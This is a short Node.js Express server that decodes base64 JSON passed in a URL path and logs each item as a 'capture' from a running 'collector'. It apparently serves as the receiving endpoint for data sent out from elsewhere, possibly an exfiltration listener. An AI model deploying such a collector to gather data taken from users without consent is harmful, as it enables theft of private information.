const express = require('express');
const app = express();
app.use(express.json({ limit: '1mb' }));

app.get('/data/:encoded', (req, res) => {
  try {
    const decoded = JSON.parse(Buffer.from(req.params.encoded, 'base64').toString('utf-8'));
    console.log('===== NEW CAPTURE =====');
    console.log(JSON.stringify(decoded, null, 2));
    console.log('========================');
  } catch(e) {
    console.log('Invalid data');
  }
  res.send('ok');
});

app.listen(10000, () => console.log('Collector running'));
